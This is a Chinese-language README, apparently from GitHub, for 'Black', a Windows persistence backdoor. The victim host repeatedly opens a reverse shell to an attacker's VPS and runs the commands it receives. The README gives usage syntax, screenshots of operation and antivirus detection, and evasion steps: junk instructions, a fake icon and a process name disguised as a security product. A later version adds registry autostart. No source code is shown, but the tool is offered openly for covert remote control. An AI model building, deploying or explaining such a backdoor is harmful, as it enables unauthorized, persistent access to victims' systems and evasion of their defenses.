## Windows权限维持工具

### version 1.0

##### **~开发思路：**

- S端通过socket管道来传输command给C端，C端执行，实现简易的后门控制
- 采用TCP socket、传输稳定，不掉包（可能会出现粘包，未做边界分离）
- 靶机为C端，公网VPS为S端，C端不断发起连接，以防掉线
- ~~混淆代码，初步免杀~~

##### ~使用方法：

> ```
> # Windows权限维持后门、持续反弹shell，60s/1次
> Black v1.0
> Usage: black.exe r_ip r_port
> author: NOVASEC_黑仔
> if cmd == quit:
>  关闭管道，临时退出
> elif cmd == exit:
>  程序结束，永久退出
> else:
> 执行命令，回显结果
> ```

##### **~使用效果：**

正常回显

![image-20210330174558324](https://user-images.githubusercontent.com/33219753/121507501-483dcb80-ca17-11eb-9132-18e9b45a831e.png)



暂时退出、断开后，60s再次连接，继续执行命令

![image-20210330174838523](https://user-images.githubusercontent.com/33219753/121507542-512e9d00-ca17-11eb-8bfe-6f41f46eccba.png)


永久退出、断开连接

![image-20210330175403279](https://user-images.githubusercontent.com/33219753/121507593-5ab80500-ca17-11eb-902c-1a746d6dd4fa.png)

靶机端口及进程情况：

![image-20210330175221694](https://user-images.githubusercontent.com/33219753/121507627-63104000-ca17-11eb-99b6-8d2dbca9e422.png)


![image-20210330175046964](https://user-images.githubusercontent.com/33219753/121507648-69062100-ca17-11eb-823a-10070b7ed93d.png)


##### ~免杀情况：

![image-20210330173705993](https://user-images.githubusercontent.com/33219753/121507680-71f6f280-ca17-11eb-8a8a-0f1e5d0e1e6d.png)


![image-20210330170259060](https://user-images.githubusercontent.com/33219753/121507747-80dda500-ca17-11eb-83e2-5bda8f65c4e9.png)


被检测出了，建议隔离

![image-20210330170745685](https://user-images.githubusercontent.com/33219753/121507784-8a670d00-ca17-11eb-94d3-c16b6cb4875a.png)

> 在之前的基础上
>
> 增加花指令
>
> 增加程序图标
>
> 其他不变（进程名360defence.exe，双进程）

![image-20210331232840781](https://user-images.githubusercontent.com/33219753/121507823-93f07500-ca17-11eb-986e-50039afdd964.png)


![image-20210331232844697](https://user-images.githubusercontent.com/33219753/121507856-9a7eec80-ca17-11eb-8d0e-a5c1c1b5f93f.png)


##### **~后期规划**：

- 进行出网判断
- 流量加密
- 进阶免杀
- 等等...

### version 1.1

- 不再提供免杀
- 修复bug，更稳定

### version 1.2

- 增加注册自启动功能

运行前：

![image-20210610164417507](https://user-images.githubusercontent.com/33219753/121507914-a79bdb80-ca17-11eb-890a-222a5bc39dc1.png)


运行后：

![image-20210610153915575](https://user-images.githubusercontent.com/33219753/121507939-af5b8000-ca17-11eb-9cd7-c98cf646553e.png)


![image-20210610165050508](https://user-images.githubusercontent.com/33219753/121507976-b84c5180-ca17-11eb-976b-d95a93d6258e.png)


重启验证：

![image-20210610175439655](https://user-images.githubusercontent.com/33219753/121507997-bc786f00-ca17-11eb-864c-d2f156f522c9.png)

![image-20210610181110442](https://user-images.githubusercontent.com/33219753/121508017-c00bf600-ca17-11eb-9061-7c550e2f368f.png)









